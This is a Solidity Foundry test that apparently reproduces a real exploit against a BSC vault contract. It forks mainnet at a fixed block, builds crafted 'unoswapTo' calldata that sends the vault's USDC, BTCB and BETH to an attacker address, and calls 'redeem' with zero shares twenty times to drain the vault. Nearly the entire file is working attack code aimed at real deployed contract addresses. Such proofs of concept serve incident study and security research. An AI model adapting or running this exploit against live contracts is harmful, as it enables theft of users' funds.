// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1782966566042181957
// @TX
// https://app.blocksec.com/explorer/tx/bsc/0x49ca5e188c538b4f2efb45552f13309cc0dd1f3592eee54decfc9da54620c2ec

interface ISportVault {
    function redeem(
        uint256 sharesToRedeem,
        address receivingAsset,
        uint256 minTokensToReceive,
        bytes[] calldata dataList,
        bool useDiscount
    ) external returns (uint256 tokensToReturn);
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 BETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ISportVault sportVault = ISportVault(0x4eDda16AB4f4cc46b160aBC42763BA63885862a4);

    address Attacker = address(0x1111111111111111111111111111111111111111);

    function setUp() public {
        vm.createSelectFork("bsc", 38_126_753);
    }

    function testExploit() public {
        bytes[] memory dataList = new bytes[](11); //@note mock data list - unoswapTo
        uint256[] memory pools = new uint256[](1);
        pools[0] = uint256(
            28_948_022_309_329_048_857_350_594_136_651_893_637_891_169_795_467_361_725_136_627_244_723_734_772_827
        );
        dataList[0] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            Attacker,
            address(USDC),
            2_331_516_232_778_274_153_239,
            0,
            pools
        );

        pools[0] = uint256(
            28_948_022_309_329_048_857_350_594_135_968_575_911_172_281_388_296_638_049_447_197_314_275_709_206_658
        );
        dataList[1] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            Attacker,
            address(BTCB),
            16_071_737_934_381_556,
            0,
            pools
        );

        pools[0] = uint256(
            28_948_022_309_329_048_857_350_594_136_076_890_004_755_093_450_729_657_598_371_073_172_666_212_569_020
        );
        dataList[2] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            Attacker,
            address(BETH),
            256_895_663_903_293_078,
            0,
            pools
        );

        dataList[3] = new bytes(0);
        dataList[4] = new bytes(0);
        dataList[5] = new bytes(0);
        dataList[6] = new bytes(0);
        dataList[7] = new bytes(0);
        dataList[8] = new bytes(0);
        dataList[9] = new bytes(0);
        dataList[10] = new bytes(0);

        console2.log("Attacker BNB balance before: ", Attacker.balance);

        for (uint256 i = 0; i < 20; i++) {
            USDC.balanceOf(address(sportVault));
            BTCB.balanceOf(address(sportVault));
            BETH.balanceOf(address(sportVault));
            BUSD.balanceOf(address(sportVault));

            sportVault.redeem(0, address(BUSD), 0, dataList, false);
        }

        console2.log("Attacker BNB balance after: ", Attacker.balance);
    }
}
